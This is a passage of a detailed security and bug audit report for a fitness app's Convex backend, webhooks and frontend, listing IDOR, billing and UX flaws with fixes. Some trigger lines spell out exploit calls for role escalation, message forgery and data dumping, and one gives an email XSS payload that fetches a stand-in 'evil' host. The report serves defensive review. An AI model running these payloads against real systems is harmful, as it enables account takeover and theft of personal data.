# 🐛 GymPro: Comprehensive Bug Bash & Quality Audit Report

> **Audit Date**: 2026-06-21
> **Scope**: `convex/`, `src/app/`, `src/components/`, `src/features/`, `src/lib/`, `src/hooks/`, `src/proxy.ts`, `public/sw.js`
> **Methodology**: Two parallel adversarial deep-dive audits (backend exploit + frontend QA) plus architectural cross-checking against `ARCHITECTURE_AND_BUSINESS_LOGIC.md`.
> **Total distinct bugs catalogued**: **109** (B-1 … B-58 backend, F-1 … F-51 frontend).
> **Audit posture**: Brutal. No sugarcoating.

---

## 1. Executive Summary & Project Scorecard

### Executive Summary

GymPro has **strong architectural foundations** — a 3-layer auth defense model, a normalized Convex schema with composite indexes, idempotent core mutations (`logSet`, `createForToday`, `submitCheckin`), and a recently-wired billing loop. The product surface is real and the UI design language is coherent.

However, the **implementation is in critical condition**:

1. **Authorization is broken at the data layer.** ~20 public Convex queries and mutations take a `userId` / `clientId` / `senderId` argument that is **not bound to the authenticated identity**. The `requireOwnership` helper's "admin/coach bypass" turns every coach into a god-mode account over every other user's data — workouts, photos, body-fat readings, messages, push tokens, gamification badges. A coach can forge messages from any user (B-04), inject fake PRs into anyone's stats (B-02), and read every conversation in the system (B-09, B-10).

2. **The newly-shipped Stripe billing gate has a self-promotion vector.** The `promoteToCoachFromBilling` mutation is acknowledged in its own docstring as "callable directly" — and it is. Anyone with the public Convex URL can run a one-line mutation to escalate themselves to `coach` (B-01). The Stripe webhook itself is also fundamentally broken: brand-new customers can't onboard because the user lookup requires a row that doesn't exist yet (B-05), out-of-order events resurrect canceled subscriptions (B-06), and `mapStripeStatus` still defaults to `"active"` for unknown Stripe states (B-07).

3. **A core UX path silently records wrong data.** The `<SetInput>` component in the workout tracker has `+/−` weight/reps buttons whose `onWeightChange` and `onRepsChange` callbacks are wired to `() => {}` no-ops (F-2). Users can tap the buttons all day; the logged set always records at the *prefilled target weight*, not what the user entered. The primary domain workflow — logging a workout — is silently broken.

4. **One admin page (`/admin/users`) crashes on the populated state** due to a reference to `handleRoleChange` where only `handleRoleFilterChange` exists (F-1). The route works in dev (empty DB) and fails in prod (real users).

5. **Test coverage is theater.** The single test file in `convex/__tests__/` re-implements the validation logic inline rather than invoking the real Convex mutations (B-55). E2E coverage is one spec. There is **no regression net** for any of the bugs above.

6. **Gamification is trivially exploitable.** Negative weights and negative reps pass validation (B-18). Backdated `sessionDate` lets a user fabricate a 30-day streak instantly (B-19). Malformed dates corrupt `userStats` permanently via `Date.UTC(NaN, …)` (B-16). The `pr_machine` / `pr_legend` badges are defined but never awarded.

7. **Crons don't scale.** Both `sendWorkoutReminders` and `sendWeeklySummariesToAll` use sequential `for` loops with per-user HTTP calls. At ~1k users they exceed Convex's action wall-clock limit. Neither is idempotent against retry (B-20, B-21, B-22).

8. **Webhook idempotency is missing.** Neither the Clerk nor Stripe webhook deduplicates by event ID (B-52, B-53). Svix and Stripe retries re-fire all downstream effects — duplicate welcome emails, duplicate audit log entries, potential subscription resurrection.

This codebase has the shape of a successful product but the substance of a security incident waiting to happen. Until the IDOR cluster is fixed and `promoteToCoachFromBilling` is locked down, **this should not be considered production-ready**.

### Project Scorecard

| Category | Max Score | Earned Score | Justification |
|----------|-----------|--------------|---------------|
| **Security & Auth** | 20 | **4** | ~20 public functions trust client-supplied `userId`/`clientId`/`senderId`; `requireOwnership` short-circuits for coaches making cross-user attacks trivial; `promoteToCoachFromBilling` allows one-call role escalation; audit log can be forged via `actorId` arg; suspension bypassable until Clerk ban lands; no CSP. **Layered defense exists but each layer has holes.** |
| **Business Logic & Data Integrity** | 25 | **9** | Stripe webhook can't onboard new customers, races resurrect canceled subs, `mapStripeStatus` default still leaks access; gamification accepts negative weights and backdated streaks; `Date.UTC(NaN)` corrupts `userStats`; PR algorithm divergence between Epley and raw-weight; conversation duplication race; sessions race conditions in `findOrCreateConversation`. Math itself is mostly correct but exploitable. |
| **Performance & Scalability** | 20 | **8** | `subscriptions.findByStripeCustomerId` full-table scan on every Stripe webhook; `getClientProgressDashboard` collects entire `sessionSets`; `auth.listAllUsers` + `audit.getAuditLogStats` full scans; crons fan out sequentially and break at ~1k users; no `React.memo` on list rows; Recharts/PDF not dynamically imported; service worker cache-busting strategy invalidates nothing. |
| **Frontend UX & Accessibility** | 15 | **5** | **Set inputs are dead** (F-2); `/admin/users` crashes (F-1); ⌘K admin search routes to 404 pages (F-4); SW push handler crashes on malformed JSON disabling all subsequent notifications (F-48); no focus trap on Suspend/Reinstate/Role dialogs; pervasive `text-[#c4c9ac]/60` body text below WCAG AA contrast; missing `htmlFor` on form labels; no scroll-locked modals; chat auto-scroll fights manual scroll; PRCelebration z-index conflicts with Sheet. |
| **Code Quality & Maintainability** | 20 | **10** | Strict TypeScript pierced by ubiquitous `as any` / `as never` / `as unknown as FunctionReference<…>` casts; Convex calls use stringly-typed paths (`"auth:getUserByClerkId" as any`); test suite re-implements logic inline rather than testing the real functions; plan builder reaches into private RHF `control._formValues` API; dual data model (legacy `plans.exercises[]` + normalized `planItems`); two divergent `assignCoach` mutations; SCREAMING_SNAKE vs camelCase audit action naming; Sentry DSN hardcoded across 3 files; dead `PostHogProvider` not mounted until Ticket 4 — pattern of "ships but unwired". |
| **TOTAL PROJECT SCORE** | **100** | **36 / 100** | **Grade: F (Failing)** |

> **Why F.** The user requested a *strict* score with heavy penalty for critical security flaws. The project has at least **6 distinct P0 security vulnerabilities** (B-01, B-02/03/04, B-08/09/10, B-11, B-12, B-13), and a P0 functional bug in the core domain workflow (F-2). Grades A-D would imply this is shippable with fixes. It is not.

---

## 2. Critical & High-Severity Bugs (P0 & P1)

The full list of all 109 bugs is below in clustered form. The 32 P0s and the most severe P1s are detailed individually with the requested format. Less critical P1s are catalogued by reference at the end of this section.

---

### [BUG-001] Self-promotion to `coach` via direct mutation call
- **Severity:** 🔴 Critical (P0)
- **Category:** Security — Role Escalation
- **Location:** `convex/subscriptions.ts:214-251` (`promoteToCoachFromBilling`)
- **The Flaw:** The mutation has **no authorization check**. Its docstring openly says it is "callable directly" by anyone with the deployment URL and that this is acknowledged future hardening. Convex public mutations are reachable by anyone.
- **Trigger:** Attacker pulls `NEXT_PUBLIC_CONVEX_URL` from the client bundle, finds their own Convex user `_id` (via `getUserByClerkId`), then calls `convex.mutation("subscriptions:promoteToCoachFromBilling", { userId: "<own_id>", source: "noop" })`. They are now `coach`.
- **Impact:** Total role escalation. Bypasses payment. Combined with B-31, attacker can read/edit any coach's plans; combined with B-33 they can review any client's check-ins; combined with B-13 they can hijack any user's push notifications. The audit log records the victim as the actor, so forensics misleadingly blames the user themselves.
- **Proposed Fix:** Convert to `internalMutation` and migrate the Stripe webhook into a Convex `httpAction` that verifies the signature inside Convex before calling the internal mutation. Short-term mitigation: require a shared-secret header argument that the Next.js webhook passes from a server-only env var.

### [BUG-002] `checkForPR` / `updateUserStats` allow coaches to corrupt any user's gamification stats
- **Severity:** 🔴 Critical (P0)
- **Category:** Security — IDOR + Data Integrity
- **Location:** `convex/gamification.ts:48-127` (checkForPR), `convex/gamification.ts:130-239` (updateUserStats)
- **The Flaw:** Both mutations call `requireOwnership(ctx, args.userId)`. `requireOwnership` (`convex/auth.ts:73-75`) **short-circuits to allow for any coach or admin caller**. So any coach can write into any user's `userStats`.
- **Trigger:** Any coach calls `updateUserStats({ userId: <victim>, sessionVolume: 1_000_000, sessionDate: "2026-06-21" })` repeatedly to insta-unlock 100K / 500K / 1M volume badges, fabricate streaks, and pollute leaderboards.
- **Impact:** Gamification integrity destroyed. Weekly summary emails surface false data. Trophy case becomes a vandalism target.
- **Proposed Fix:** Replace `requireOwnership` with strict identity binding: derive `userId` from `ctx.auth.getUserIdentity()`. Make these functions `internalMutation`s called only by a trusted session-finish flow.

### [BUG-003] `submitCheckin` IDOR — coaches can forge check-in data for any client
- **Severity:** 🔴 Critical (P0)
- **Category:** Security — IDOR + Data Integrity
- **Location:** `convex/checkins.ts:121-180`
- **The Flaw:** Same `requireOwnership` short-circuit. The mutation does not check that the target user is actually one of the caller's assigned clients.
- **Trigger:** Coach calls `submitCheckin({ userId: <unrelated victim>, weekNumber: 25, weight: 999, bodyFat: 99, photoStorageIds: [...] })` and **overwrites** the victim's legitimate weekly check-in (it's an upsert keyed by `(userId, weekNumber)`).
- **Impact:** Coach can vandalize across coach boundaries; legitimate check-ins are silently destroyed; coach-of-record data integrity ruined.
- **Proposed Fix:** Bind to identity; if caller is a coach, validate `targetUser.coachId === caller._id`.

### [BUG-004] `sendMessage` / `markAsRead` / `findOrCreateConversation` / `setTypingIndicator` trust spoofable `senderId` / `userId`
- **Severity:** 🔴 Critical (P0)
- **Category:** Security — Identity Spoofing
- **Location:** `convex/messages.ts:169-307`
- **The Flaw:** None of these mutations call `ctx.auth.getUserIdentity()`. The participant check only verifies that the *supplied* `senderId` is in the conversation's participant list — it never verifies the caller IS that participant.
- **Trigger:** Attacker calls `findOrCreateConversation({ userId1: <victim>, userId2: <anyone> })` to create a conversation containing the victim, then `sendMessage({ conversationId, senderId: <victim>, body: "I confess" })`. The message persists with the victim's name.
- **Impact:** **Total message forgery.** Coach contracts, "verbal" agreements in chat, anything ever transcribed in a GymPro DM can be repudiated. Combined with B-12, the attacker simultaneously drains the victim's rate-limit bucket.
- **Proposed Fix:** Resolve sender from `ctx.auth.getUserIdentity()`. Ignore client-supplied `senderId`. Same fix for the other three.

### [BUG-005] Stripe webhook silently drops every new-customer checkout
- **Severity:** 🔴 Critical (P0)
- **Category:** Backend Logic / Revenue Loss
- **Location:** `src/app/api/webhooks/stripe/route.ts:84-110` + `convex/subscriptions.ts:83-93`
- **The Flaw:** `findUserByStripeCustomerId` looks up an *existing* row keyed by `stripeCustomerId`. For brand-new customers there is no such row, so the `if (!subscription)` branch fires, logs `"No subscription found for customer:"`, and `break`s. The user is never promoted, never gets a subscription row, and `customer.subscription.created`/`.updated` fail the same lookup forever.
- **Trigger:** ANY new paying customer completes Stripe Checkout.
- **Impact:** **Every legitimate first-time paying customer fails to onboard.** Revenue collected, product not delivered. Manual reconciliation required for every customer.
- **Proposed Fix:** At Stripe Checkout session creation time, pass `client_reference_id` = Convex `userId` and `metadata.userId`. Read it in the webhook to resolve the user. Add a `by_stripeCustomerId` composite index to `subscriptions`. Insert-on-missing semantics in `upsertSubscription`.

### [BUG-006] Out-of-order Stripe webhook delivery resurrects canceled subscriptions
- **Severity:** 🔴 Critical (P0)
- **Category:** Backend Logic / Revenue Loss
- **Location:** `src/app/api/webhooks/stripe/route.ts:171-229`
- **The Flaw:** `customer.subscription.deleted` sets status to `canceled`; `invoice.payment_succeeded` later unconditionally sets `active`. There is **no event-ordering guard** (no `event.created` comparison). Stripe explicitly does not guarantee in-order delivery.
- **Trigger:** Stripe fires final-period `invoice.payment_succeeded` shortly before `customer.subscription.deleted`. Retries arrive out of order — cancellation processed first, then succeeded re-flips status to `active`.
- **Impact:** Canceled coaches retain platform access. Revenue leak + ex-coach privacy issue (still sees clients).
- **Proposed Fix:** Store `event.created` on every subscription update. Reject any update older than the persisted timestamp. Alternatively, always re-fetch via `stripe.subscriptions.retrieve` at the start of the handler and treat that as ground truth.

### [BUG-007] `mapStripeStatus` still defaults unknown statuses to `"active"`
- **Severity:** 🔴 Critical (P0)
- **Category:** Backend Logic / Revenue Loss
- **Location:** `src/app/api/webhooks/stripe/route.ts:278-297`
- **The Flaw:** The `default` branch returns `"active"`. Stripe statuses include `incomplete`, `paused`. An `incomplete` subscription (customer's card declined, never retried) maps to `"active"`. Ticket 5 only fixed `incomplete_expired`.
- **Trigger:** Customer enters card details, hits 3DS challenge, abandons. Stripe creates the subscription in `incomplete`. Webhook maps it to `"active"`. Customer is auto-promoted to `coach`.
- **Impact:** Free coach tier for anyone willing to abandon a checkout.
- **Proposed Fix:** Default branch must be `"canceled"` (fail-safe). Add explicit `incomplete` and `paused` cases mapping to `canceled`.

### [BUG-008] Unauthenticated queries return any user's full workout + photo + body-fat history
- **Severity:** 🔴 Critical (P0)
- **Category:** Security — PII Exfiltration / Potential GDPR Breach
- **Location:** `convex/plans.ts:158-207` (`getActivePlanWithItems`), `convex/sessions.ts:267-452` (`getClientProgressDashboard`), `convex/sessions.ts:13-22` (`getByClient`), `convex/plans.ts:22-31` (`getByClient`), `convex/progress.ts:13-22` (`getByClient`), `convex/checkins.ts:8-36` (`getUserCheckins`)
- **The Flaw:** Public queries accept `clientId` with **no auth check**. Convex queries are reachable from anywhere with the public URL. Anyone can enumerate user IDs (via `getUserByClerkId` or `listCoaches`) and dump every client's full plan, every session ever logged, every body-fat measurement, every check-in photo URL.
- **Trigger:** `curl`/`fetch` against `<convex_url>/api/query/plans:getActivePlanWithItems` with any `clientId`.
- **Impact:** **Mass PII exfiltration** — fitness data is regulated (HIPAA-adjacent in US, GDPR in EU). Check-in photos are user selfies. This is a notifiable breach in most jurisdictions.
- **Proposed Fix:** Add `requireOwnership(ctx, args.clientId)` to every read, OR delete these and only expose narrow per-feature queries that derive `clientId` from `ctx.auth`.

### [BUG-009] `messages.getMessages` and `messages.getConversations` IDOR
- **Severity:** 🔴 Critical (P0)
- **Category:** Security — Communications Privacy
- **Location:** `convex/messages.ts:8-85` (`getConversations`), `convex/messages.ts:87-135` (`getMessages`)
- **The Flaw:** Both queries take `userId` with no auth — they only check that the supplied `userId` is a participant, not that the caller is that user.
- **Trigger:** Attacker enumerates participant pairs, then `convex.query("messages:getMessages", { conversationId, userId: <participant> })`. Returns every message.
- **Impact:** Full DM history exfiltration for every conversation in the system. Read receipts (`readBy[]`) leak surveillance metadata.
- **Proposed Fix:** Derive caller from identity; ignore `userId` arg.

### [BUG-010] `generateUploadUrl` lets anyone upload unlimited files to Convex Storage
- **Severity:** 🔴 Critical (P0)
- **Category:** Security — Cost-DoS + Content Hosting Abuse
- **Location:** `convex/checkins.ts:113-118`
- **The Flaw:** Public mutation. No auth. No rate limit. No per-user quota. Returns a Convex storage URL that accepts any size, any MIME type.
- **Trigger:** `while true: convex.mutation("checkins:generateUploadUrl")` then PUT multi-GB binaries. You pay the storage bill. Could host illegal content under your domain.
- **Impact:** Cost-amplification DoS; illegal content hosting (CSAM, malware) attributable to the platform domain.
- **Proposed Fix:** `requireRole(["user","coach","admin"])` minimum (logged in). Add per-user rate limit (already a key for `push:saveSubscription` — extend the pattern). Require a `confirmUpload` mutation that validates MIME via `ctx.storage.getMetadata` and binds the storage ID to a user.

### [BUG-011] Rate-limit bypass via spoofed `senderId`
- **Severity:** 🔴 Critical (P0)
- **Category:** Security — DoS Against Other Users
- **Location:** `convex/messages.ts:215`, `convex/rateLimit.ts:76-88`
- **The Flaw:** `checkMutationRateLimit(ctx, "messages:send", args.senderId)` keys the bucket by the *argument* `senderId`. Combined with B-04 (no identity binding), the attacker picks the victim's ID.
- **Trigger:** Attacker fires 20 messages/min with `senderId: <victim>`. Victim's bucket is now full and they can't send anything for 60s.
- **Impact:** Targeted DoS against any user's messaging. Attacker's own bucket is untouched (they can spam without limit).
- **Proposed Fix:** Key the rate limit by the authenticated caller's ID, not the arg.

### [BUG-012] `push.saveSubscription` IDOR — coach can hijack any user's push notifications
- **Severity:** 🔴 Critical (P0)
- **Category:** Security — Notification Hijack
- **Location:** `convex/push.ts:42-79` (`saveSubscription`), `convex/push.ts:123-137` (`unsubscribe`)
- **The Flaw:** `requireOwnership` again short-circuits for coaches/admins. The HTTP `/api/push/subscribe` route correctly resolves the user from Clerk, but the underlying Convex mutation is still publicly callable.
- **Trigger:** Coach calls `push.saveSubscription({ userId: <victim>, endpoint: <coach's own webpush endpoint>, ... })`. Workout reminders now go to the coach's device.
- **Impact:** Push notification hijack — workout reminders, check-in nudges, future message previews land on the wrong device.
- **Proposed Fix:** Bind to identity; never trust client-supplied userId.

### [BUG-013] `gamification.getUserStats` IDOR — anyone reads anyone's badge/streak/volume
- **Severity:** 🟠 High (P1) — would be P0 if treated as PII
- **Category:** Security — Privacy
- **Location:** `convex/gamification.ts:22-43`
- **The Flaw:** Public query, no auth, accepts any `userId`.
- **Trigger:** `convex.query("gamification:getUserStats", { userId: <anyone> })`.
- **Impact:** Training volume, streak, badge data leaked. Some jurisdictions regulate aggregate fitness data.
- **Proposed Fix:** Require ownership or restrict to coach-of-client.

### [BUG-014] Audit log forgery via `actorId` argument
- **Severity:** 🔴 Critical (P0)
- **Category:** Security — Audit Integrity / Compliance
- **Location:** `convex/audit.ts:111-211` (`logAuditEvent`)
- **The Flaw:** `logAuditEvent` accepts `actorId: v.id("users")` as an arg and writes it directly into the audit row (not derived from identity). `requireRole(["admin"])` gates execution but not forgery — any admin can blame any other admin.
- **Trigger:** Admin A calls `logAuditEvent({ actorId: <admin B>, action: "DELETED_ALL_DATA", ... })`. Forensics blames B.
- **Impact:** Audit integrity destroyed. SOC2 / SOX / ISO27001 non-compliance.
- **Proposed Fix:** Derive `actorId` server-side from `ctx.auth.getUserIdentity()`. Remove the arg entirely.

### [BUG-015] `Date.UTC(NaN, …)` crash corrupts `userStats` permanently
- **Severity:** 🔴 Critical (P0)
- **Category:** Backend Logic / Data Corruption
- **Location:** `convex/gamification.ts:149-155`
- **The Flaw:** Streak math splits `sessionDate` on `-` and casts to Number. If `sessionDate` is malformed (`"abc"`, `"2024/06/21"`, empty), `Number()` yields `NaN`, `Date.UTC(NaN, …)` returns `NaN`, `diffDays` is `NaN`, comparisons short-circuit to `newStreak = 1`, and `lastWorkoutDate` is patched to garbage. Subsequent calls then fail on the garbage date.
- **Trigger:** Any caller passes `sessionDate: ""` or `"🥲"`. Combined with B-02, an attacker can corrupt any user's stats permanently.
- **Impact:** Streak permanently broken for the victim; weekly summary emails ship garbage.
- **Proposed Fix:** Validate with `/^\d{4}-\d{2}-\d{2}$/` and reject. Never write a non-validated date string into `userStats.lastWorkoutDate`.

### [BUG-016] `findOrCreateConversation` race creates duplicate conversations
- **Severity:** 🟠 High (P1)
- **Category:** Backend Logic / Race Condition
- **Location:** `convex/messages.ts:169-197`
- **The Flaw:** Two concurrent calls — one with `[A, B]`, one with `[B, A]` — both check both orderings, both find nothing, both `insert`. Convex OCC doesn't detect the conflict because the writes touch disjoint documents.
- **Trigger:** Coach opens chat with client while client opens chat with coach. Both panels load simultaneously.
- **Impact:** Split-brain conversations. Half the messages land in one row, half in the other. Coach and client see different histories.
- **Proposed Fix:** Canonicalize participant array (sort lexicographically) and use a deterministic doc ID (e.g., `conv_${a}_${b}` after sorting). The second insert fails idempotently.

### [BUG-017] Gamification farming via negative weight / negative reps
- **Severity:** 🟠 High (P1)
- **Category:** Business Logic / Gamification Exploit
- **Location:** `convex/sessions.ts:171-225` (`logSet`) and `convex/gamification.ts:60`
- **The Flaw:** `logSet` validates `setIndex` bounds but **never validates `actualWeight ≥ 0` or `actualReps ≥ 0`**. Epley `weight * (1 + reps / 30)`: with `reps = -30` the multiplier is `0`; with `weight = 1e15` the 1RM is `1e15` → instant PR.
- **Trigger:** Attacker (or a malicious user via the network panel) calls `logSet` with `actualWeight: 1e15, actualReps: 1`. Instant `first_pr` badge; admin dashboard volume shows ∞.
- **Impact:** Gamification trivially gameable. Combined with B-44, admin metrics break.
- **Proposed Fix:** Validate `0 < actualWeight ≤ 1000` and `0 < actualReps ≤ 100`. Same for `targetWeight`/`targetReps`.

### [BUG-018] Backdated `sessionDate` streak farming
- **Severity:** 🟠 High (P1)
- **Category:** Business Logic / Gamification Exploit
- **Location:** `convex/gamification.ts:130-239`
- **The Flaw:** `updateUserStats` takes `sessionDate` as a string arg. No check that the date is "today" or "in the past or today". A user can script 30 calls with dates `2026-05-22` … `2026-06-21` to fabricate a 30-day streak.
- **Trigger:** Power user with a few minutes of curiosity. All three streak badges (7 / 14 / 30) become insta-claimable.
- **Impact:** Streak leaderboards meaningless.
- **Proposed Fix:** Derive `sessionDate` server-side from `Date.now()` (UTC), or require `args.sessionDate === todayUTC`.

### [BUG-019] Cron `sendWorkoutReminders` doesn't fan out; breaks at ~1k users
- **Severity:** 🟠 High (P1)
- **Category:** Performance / Scalability
- **Location:** `convex/pushActions.ts:63-124`
- **The Flaw:** Sequential `for` loop over every user with an active plan. Per user: 4 sequential queries + 1 webPush call. At 1k users that's 5k sequential round-trips, exceeding the Convex action wall-clock limit. Partial failures aren't retried (no idempotency).
- **Trigger:** User base passes ~1k.
- **Impact:** Reminders stop firing. Action timeouts; cron silently fails.
- **Proposed Fix:** Schedule sub-actions via `ctx.scheduler.runAfter` per chunk of N users. Persist a `sentReminders` table keyed by `(userId, dateUTC)` for dedupe.

### [BUG-020] Same fan-out problem in weekly-summary cron
- **Severity:** 🟠 High (P1)
- **Category:** Performance / Scalability
- **Location:** `convex/emailActions.ts:218-271`
- **The Flaw:** Sequential per-user loop with 2 queries + 1 Resend HTTP call. Breaks at ~1k users. No idempotency — on retry, users receive duplicate weekly emails.
- **Trigger:** Cron retry or user-base growth.
- **Impact:** Duplicate emails (reputation damage) or no emails at all (cron timeout).
- **Proposed Fix:** Same — `runAfter` per chunk + idempotency table keyed by `(userId, weekStart)`.

### [BUG-021] Edge proxy bypass during Convex outage
- **Severity:** 🟠 High (P1)
- **Category:** Security — Availability + Authorization
- **Location:** `src/proxy.ts:27-45, 71-94`
- **The Flaw:** `getAuthContext` catches Convex errors and returns `{ role: null, hasActiveSubscription: false }`. For `/coach/*` routes this is fail-closed (good), BUT during a transient Convex blip **every paying coach is mass-redirected** to `/dashboard?reason=billing`. Also, the proxy never checks `status === "suspended"` so suspended users with valid Clerk sessions retain access through every non-admin, non-coach route.
- **Trigger:** Convex 5xx for 30s → coach lockout. Or: admin suspends user; Clerk ban takes seconds to land; in the window, the user keeps moving.
- **Impact:** Self-DoS for paying customers during platform outages; suspension is partially effective.
- **Proposed Fix:** Distinguish "Convex unreachable" (serve 503 or use stale cache) from "no subscription". Add explicit `status === "suspended"` check that redirects to a "Account suspended" page.

### [BUG-022] Webhook idempotency missing (Clerk + Stripe)
- **Severity:** 🟠 High (P1)
- **Category:** Backend Logic / Side Effects
- **Location:** `src/app/api/webhooks/clerk/route.ts:96-201`, `src/app/api/webhooks/stripe/route.ts:96-264`
- **The Flaw:** Neither handler dedupes by event ID (`svix-id`, `stripe.event.id`). Retries re-fire all downstream effects.
- **Trigger:** Svix retries `user.created` → user receives duplicate welcome email. Stripe retries `checkout.session.completed` → duplicate `COACH_PROMOTION_VIA_BILLING` audit log entries; if a manual `cancel()` ran in between, the retry resurrects the subscription.
- **Impact:** Duplicate emails, audit-log pollution, potential subscription resurrection.
- **Proposed Fix:** Add a `processedWebhookEvents` table keyed by `(provider, eventId)`. Insert-or-throw at the top of every handler.

### [BUG-023] `/admin/users` ReferenceError crashes the entire users page
- **Severity:** 🔴 Critical (P0)
- **Category:** Frontend Crash
- **Location:** `src/components/admin/users/users-data-table.tsx:185`
- **The Flaw:** Toolbar in the populated-data branch is passed `onRoleChange={handleRoleChange}` but the defined handler is `handleRoleFilterChange`. The loading and empty branches use the correct name.
- **Trigger:** Admin loads `/admin/users` with at least one user present (always, in production).
- **Impact:** ReferenceError → caught by admin error boundary → page unusable. Admin user management is dark.
- **Proposed Fix:** Rename to `handleRoleFilterChange` (or define an alias).

### [BUG-024] `<SetInput>` weight/reps changes are no-ops
- **Severity:** 🔴 Critical (P0)
- **Category:** Frontend / Core UX
- **Location:** `src/components/user/session/exercise-tracker.tsx:115-116`
- **The Flaw:** `<SetInput>` is rendered with `onWeightChange={() => {}}` and `onRepsChange={() => {}}`. The +/− buttons inside `<SetInput>` update internal display state but never propagate up. `handleComplete` always uses the prop-derived `set.actualWeight`/`set.actualReps`, which comes from `localSets` (target value or last-logged value).
- **Trigger:** User taps + on weight, taps Check. The logged set records the *target* weight, not what the user entered.
- **Impact:** **The primary domain workflow silently records wrong data.** Every workout is logged at planned weight/reps regardless of what the user did. PR detection, volume tracking, streaks — all built on garbage data.
- **Proposed Fix:** Lift weight/reps to local state in `ExerciseTracker` (`useState` per set) and pass real setters. Or change `SetInput` to be uncontrolled and pass current values via the `onComplete` callback.

### [BUG-025] ⌘K admin search routes to non-existent pages
- **Severity:** 🔴 Critical (P0)
- **Category:** Frontend / Routing
- **Location:** `src/app/admin/command-k.tsx:50-72, 126`
- **The Flaw:** Results route to `/admin/users/${clerkId}`, `/admin/plans/${id}`, `/admin/sessions/${id}` — none of those routes exist. There's no `src/app/admin/users/[clerkId]/page.tsx`.
- **Trigger:** Admin opens ⌘K, picks any result, presses Enter.
- **Impact:** Most prominently advertised admin feature 404s on every result.
- **Proposed Fix:** Either create the routes or change targets to existing pages (`/admin/users?focus=${id}`).

### [BUG-026] Service worker push handler crashes on malformed payload
- **Severity:** 🔴 Critical (P0)
- **Category:** Frontend / Reliability
- **Location:** `public/sw.js:109-123`
- **The Flaw:** `event.data.json()` is called without try/catch. An unhandled rejection inside a service worker push event can break **all subsequent push deliveries** until the SW restarts.
- **Trigger:** One malformed push (testing error, attacker, mis-wired action).
- **Impact:** Push notifications go permanently dark for that browser until the user clears the SW.
- **Proposed Fix:** Wrap in try/catch; fall back to `event.data.text()` and use a safe default payload.

### [BUG-027] Plan `update` mutation has no per-coach ownership check
- **Severity:** 🟠 High (P1)
- **Category:** Security — Cross-Tenant Write
- **Location:** `convex/plans.ts:79-99`
- **The Flaw:** `requireRole(["coach","admin"])` allows any coach. The plan's `coachId` is never compared to the caller. Coach A can archive Coach B's plans.
- **Trigger:** Malicious coach calls `plans:update` with another coach's `planId`.
- **Impact:** Coach-vs-coach sabotage; plans silently disappear from clients.
- **Proposed Fix:** Verify `plan.coachId === caller._id` (admin bypass).

### [BUG-028] `sessions.create` / `sessions.complete` cross-coach interference + no billing gate
- **Severity:** 🟠 High (P1)
- **Category:** Security — Cross-Tenant + Billing Gap
- **Location:** `convex/sessions.ts:35-95`
- **The Flaw:** `create` checks role but not whether the coach owns the client. `complete` uses `requireOwnership(session.clientId)` which lets any coach finish anyone's session. Neither calls `requireActiveSubscription` — billing-gate-bypass by creating sessions directly without `createPlanWithItems`.
- **Trigger:** Lapsed coach scripts `sessions.create` for their clients to keep training them.
- **Impact:** Cross-coach interference + billing bypass.
- **Proposed Fix:** Verify coach owns the client; add `requireActiveSubscription` to all coach-side mutations.

### [BUG-029] `reviewCheckin` allows any coach to review any client's check-in
- **Severity:** 🟠 High (P1)
- **Category:** Security — Cross-Tenant Write
- **Location:** `convex/checkins.ts:183-199`
- **The Flaw:** `requireRole(["coach","admin"])` — no check that the check-in's user is one of caller's clients.
- **Trigger:** Coach marks another coach's clients' check-ins as `"reviewed"`.
- **Impact:** Workflow chaos; coaches' inboxes manipulated by competitors.
- **Proposed Fix:** Look up `checkin.userId` → fetch user → verify `user.coachId === caller._id`.

### [BUG-030] Stripe `findByStripeCustomerId` full-table scan on every webhook event
- **Severity:** 🟠 High (P1)
- **Category:** Performance / Scalability
- **Location:** `convex/subscriptions.ts:83-93`
- **The Flaw:** Code comment admits the workaround. Every Stripe webhook scans the entire `subscriptions` table.
- **Trigger:** Subscription table grows → webhook latency grows linearly → eventual webhook timeout.
- **Impact:** Performance crisis at scale; Stripe retries amplify load.
- **Proposed Fix:** Add `subscriptions.by_stripeCustomerId` index; use it in the lookup.

### [BUG-031] `auth.searchAll`, `auth.listAllUsers`, `auth.getSystemHealth` collect entire tables
- **Severity:** 🟠 High (P1)
- **Category:** Performance / Scalability
- **Location:** `convex/users.ts:340-454`
- **The Flaw:** `getSystemHealth` collects `users`, `sessions`, `plans`, AND `sessionSets`. At scale `sessionSets` may exceed Convex's per-query row limit (~16k). `getAuditLogStats` does the same on `auditLogs`.
- **Trigger:** Admin opens system-health dashboard after several months of usage.
- **Impact:** Query throws "Too many results"; admin dashboard broken.
- **Proposed Fix:** Maintain a denormalized aggregate counter (`platformMetrics` doc), updated by mutations and a periodic cron. Read the counter, not the source tables.

### [BUG-032] Clerk ban action can throw silently after suspension is recorded
- **Severity:** 🟠 High (P1)
- **Category:** Backend Logic / Suspension Bypass
- **Location:** `convex/users.ts:298-301`, `convex/clerkActions.ts:12-37`
- **The Flaw:** `suspendUser` patches the Convex row to `suspended`, then schedules `banUserInClerk`. If the action throws (Clerk down, missing `CLERK_SECRET_KEY`, network), there's no retry or rollback. Convex says suspended; Clerk says active; user keeps their session.
- **Trigger:** `CLERK_SECRET_KEY` not set in Convex env → every ban silently fails. Or transient Clerk 5xx.
- **Impact:** Suspension is a no-op. Combined with B-021, suspended users continue to roam.
- **Proposed Fix:** Add scheduler retry semantics. Add a reconciliation cron that compares Convex `status` vs Clerk ban state and re-issues bans.

### [BUG-033] `messages.sendMessage` accepts control + bidi characters
- **Severity:** 🟠 High (P1)
- **Category:** Security — Phishing via Chat
- **Location:** `convex/messages.ts:200-241`
- **The Flaw:** Only `trim()` and length check. `‮` (right-to-left override) lets `"https://gympro.app/‮evil.com/legit"` render as `gympro.app/tigel/moc.live` in some contexts.
- **Trigger:** Attacker sends URL-spoofed bidi-override message.
- **Impact:** Phishing through trusted chat surface.
- **Proposed Fix:** Strip control characters and bidi controls. Consider an allowlist of safe Unicode ranges.

### [BUG-034] Resend email templates HTML-inject user `name`
- **Severity:** 🟠 High (P1)
- **Category:** Security — Email XSS
- **Location:** `convex/emailActions.ts:51-160` (WELCOME / WEEKLY_SUMMARY templates)
- **The Flaw:** `${name}` is interpolated directly into HTML strings. User-controlled name from Clerk metadata can carry `<img src=x onerror=...>` or CSS injection.
- **Trigger:** Attacker sets Clerk first/last name to `</style><img src=x onerror=fetch('https://evil')>`.
- **Impact:** XSS within email client (some clients sanitize, many don't). Phishing pretexts inside legitimate-looking GymPro emails.
- **Proposed Fix:** HTML-escape every interpolated string. Or use a templating library with auto-escape.

### [BUG-035] `progress.create` IDOR — coach can forge body measurements for any client
- **Severity:** 🟠 High (P1)
